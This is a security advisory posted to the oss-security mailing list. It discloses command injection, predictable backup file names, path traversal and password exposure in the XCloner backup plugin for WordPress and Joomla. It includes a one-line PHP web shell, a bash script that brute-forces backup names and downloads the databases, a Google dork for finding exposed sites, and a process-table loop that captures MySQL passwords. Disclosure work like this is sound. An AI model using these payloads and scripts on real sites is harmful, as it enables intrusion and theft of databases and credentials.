  oss-security - XCloner Wordpress/Joomla! backup Plugin (Wordpress)  (Joomla!) Vulnerabilities            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Wed, 05 Nov From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: XCloner Wordpress/Joomla! backup Plugin (Wordpress)  (Joomla!) Vulnerabilities  Title: XCloner Wordpress/Joomla! backup Plugin (Wordpress) (Joomla!) Vulnerabilities Author: Larry W. Cashdollar, @_larry0 Date: Download: https://wordpress.org/plugins/xcloner-backup-and-restore/ Download: Downloads: Wordpress Joomla! StandAlone Website: http://www.xcloner.com Advisory: Vendor: Notified Ovidiu Liuta, @thinkovi Acknowledged & no other response. CVEID: Requested, TDB.  Description: “XCloner is a Backup and Restore component designed for PHP/Mysql websites, it can work as a native plugin for WordPress and Joomla!.”  Vulnerabilities:  There are multiple vulnerabilities I’ve discovered in this plugin, they are as follows.  1. Arbitrary command execution. 2. Clear text MySQL password exposure through html text box under configuration panel. 3. Database backups exposed to local users due to open file permissions. 4. Unauthenticated remote access to backup files via easily guessable file names. 5. Authenticated remote file access.  6. MySQL password exposed to process table.  Arbitrary Command Execution  Plugin allows arbitrary commands to be executed by an authenticated user.  The user will require administrative access rights to backup the database. User input when specifying your own file name is not sanitized as well as various other input fields.  PoC All input fields I believe are vulnerable, I’ve chosen the backup filename and a wget of sh.txt which is simply <?php passthru($_GET)?> into a writeable directory by www-data.  Screenshots available at the advisory URL above.  All user configurable variables are vulnerable, these variables need to be sanitized before being passed to the exec() function for execution. $_CONFIG[tarpath] $exclude $_CONFIG['tarcompress'] $_CONFIG['filename'] $_CONFIG['exfile_tar'] $_CONFIG[sqldump] $_CONFIG['mysql_host'] $_CONFIG['mysql_pass'] $_CONFIG['mysql_user'] $database_name $sqlfile $filename  Vulnerable code    ./cloner.functions.php:        exec($_CONFIG[tarpath] . " $exclude -c" . $_CONFIG['tarcompress'] . "vf $filename ./administrator/backups/index.html");       exec($_CONFIG[tarpath] . " -" . $_CONFIG['tarcompress'] . "vf $filename --update ./administrator/backups/database-sql.sql");       exec($_CONFIG[tarpath] . " -" . $_CONFIG['tarcompress'] . "vf $filename --update ./administrator/backups/htaccess.txt");       exec($_CONFIG[tarpath] . " -" . $_CONFIG['tarcompress'] . "vf $filename --update ./administrator/backups/perm.txt");           if ($_REQUEST[cron_dbonly] != 1) {              exec($_CONFIG[tarpath] . " $excl_cmd " . " -X " . $_CONFIG['exfile_tar'] . "  -chv" . $_CONFIG['tarcompress'] . "f $filename ./");          } else {      exec($_CONFIG[tarpath] . "  -" . $_CONFIG['tarcompress'] . "cvf $filename ./administrator/backups/database-sql.sql");              if (is_array($databases_incl)) {                  foreach ($databases_incl as $database_name)                      if ($database_name != "") {                          exec($_CONFIG[tarpath] . "  -" . $_CONFIG['tarcompress'] . "vf $filename --update  ./administrator/backups/" . $database_name . "-sql.sql");                      }              }          } --  {      //$sizeInBytes = filesize($path);      $sizeInBytes = sprintf("%u", filesize($path));      if ((!$sizeInBytes) and (function_exists("exec"))){          $command = "ls -l \"$path\" | cut -d \" \" -f 5";          $sizeInBytes = @exec($command);      }       if ($_CONFIG['sql_mem']) {          exec($_CONFIG[sqldump] . " -h " . $_CONFIG['mysql_host'] . " -u " . $_CONFIG['mysql_user'] . " -p" . $_CONFIG['mysql_pass'] . " " . $dbname . " > " . $sqlfile . " $drop --allow-k eywords " . $ex_dump);          if (get_filesize($sqlfile) > 0)              $databaseResult = LM_DATABASE_BACKUP_COMPLETED . ' ( ' . getFileSizeText(get_filesize($sqlfile)) . ' )';          else              $databaseResult = LM_MSG_BACK_14;          exec("chmod $sqlfile");          return $sqlfile;      }  ./classes/fileRecursion.php    public static function getFileSize($file){      $sizeInBytes = sprintf("%u", filesize($file));      if ((!$sizeInBytes) and (function_exists("exec"))){          $command = "ls -l \"$file\" | cut -d \" \" -f 5";          $sizeInBytes = @exec($command);      }      return $sizeInBytes; ./restore/XCloner.php    }else{            if($ext == '.tgz') $compress = 'z';            else $compress = '';            shell_exec("tar -x".$compress."pf $file -C $_CONFIG[output_path]");    }     if($_REQUEST['use_mysqldump'] == 1){           echo shell_exec($_REQUEST['mysqldump_path']." -u ".$_REQUEST[mysql_username]." -p".$_REQUEST[mysql_pass]." -h ".$_REQUEST[mysql_server]." ".$_REQUEST[mysql_db]." < ".$sqlfile);           return;    }     Clear Text MySQL Database Password   The plugin also returns the MySQL clear text password via html text box back to the user in the configuration panel.  A password should never be repeated back to you in clear text.  The plugin will happily send this over a clear text connection.    Screen Shot at PM.png           Remote Database Download & Local File Permissions   The default recommend path for backup storage is /usr/share/wordpress/administrator/backups. An index.html file is created under this directory to prevent casual browsing however the file names are easily predictable. From the installation instructions:   “XCloner is a tool that will help you manage your website backups, generate/restore/move so your website will be always secured! With XCloner you will be able to clone your site to any other location with just a few clicks. Don't forget to create the 'administrator/backups' directory in your Wordpress root and make it fully writeable.”   The format of the filenames are: backup_year-month-day_month_24hour_minute_domainname-sql-OPTIONS.tar where OPTIONS could be either -sql-drop, -sql-nodrop or -nosql depending on options selected during time of backup.   The domain name is set by the HTTP_HOST header from line 88 of  cloner.config.php:   88: $_CONFIG['mosConfig_live_site']=$_SERVER['HTTP_HOST'];   root@...ry:/usr/share/wordpress/administrator/backups# ls -l total -rw-r--r-- 1 www-data www-data Oct 29 -rw-r--r-- 1 www-data www-data Oct 29 -rw-r--r-- 1 www-data www-data Oct 29     These file permissions also expose the contents of the databases to any local system users.   File naming convention code is as follows:            $domainname = $_CONFIG['mosConfig_live_site'];          if ($_REQUEST['bname'] == "") {              if ($backupDatabase == 1) {                  if ($_REQUEST['dbbackup_drop']) {                      $filename1 = 'backup_' . date("Y-m-d_H-i") . '_' . $domainname . '-sql-drop' . $f_ext;                  } else {                          $filename1 = 'backup_' . date("Y-m-d_H-i") . '_' . $domainname . '-sql-nodrop' . $f_ext;                  }              } else                  $filename1 = 'backup_' . date("Y-m-d_H-i") . '_' . $domainname . '-nosql' . $f_ext;          } else {      snapshot3.png       I’ve found a few vulnerable websites with the google dork:   https://www.google.com/#q=inurl:+administrator%2Fbackups   A PoC:   lwc@...dpress:~$ bash exp.sh [+] Location Found [+] Received HTTP/1.1 OK Downloading......  Connecting to connected. HTTP request sent, awaiting response... OK Length: (42M) [application/x-tar] Saving to:      in 0.7s       MB/s) - saved   [+] Location Found [+] Received HTTP/1.1 OK Downloading......  Connecting to connected. HTTP request sent, awaiting response... OK Length: (42M) [application/x-tar] Saving to:      in 0.7s       MB/s) - saved   #!/bin/bash #Exploit to download XCloner Database backups OSVDB: #Larry W. Cashdollar, @_larry0 #XCloner recommends a backup storage path under the WP root directory #it uses a 0 size index.html file to block indexing. #we can try to brute force the filenames it creates.   MONTH=10 DAY=30 #May need to set the DOMAIN to $1 the target depending on how WP is configured. DOMAIN=   for y in `seq -w 1 24`; do         for x in `seq -w 1 59`; do                                   RESULT=`curl -s --head $CPATH|grep                 if [ -n "$RESULT" ]; then                  echo "[+] Location $CPATH Found";                  echo "[+] Received $RESULT";                  echo "Downloading......";                  wget $CPATH                 fi;         done done     Remote File Access   The user has to have administrative rights, but the backup downloader doesn’t check the path for ../.     Will download /etc/passwd off the remote system.   MySQL Database Password Exposed to Process Table   Local users can steal the MySQL password by watching the process table:   lwc@...dpress:/etc/wordpress$ while (true); do ps -ef |grep [m]ysqldump; done www-data   0 ?        sh -c mysqldump --quote-names  -h localhost -u root -pPASSWORDHERE wordpress > /usr/share/wordpress/administrator/backups/database-sql.sql  --allow-keywords  www-data  0 ?        mysqldump --quote-names -h localhost -u root -px xxxxxx wordpress --allow-keywords www-data   0 ?        sh -c mysqldump --quote-names  -h localhost -u root -ps3cur1ty wordpress > /usr/share/wordpress/administrator/backups/database-sql.sql  --allow-keywords  www-data  0 ?        mysqldump --quote-names -h localhost -u root -px xxxxxx wordpress --allow-keywords ^C Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      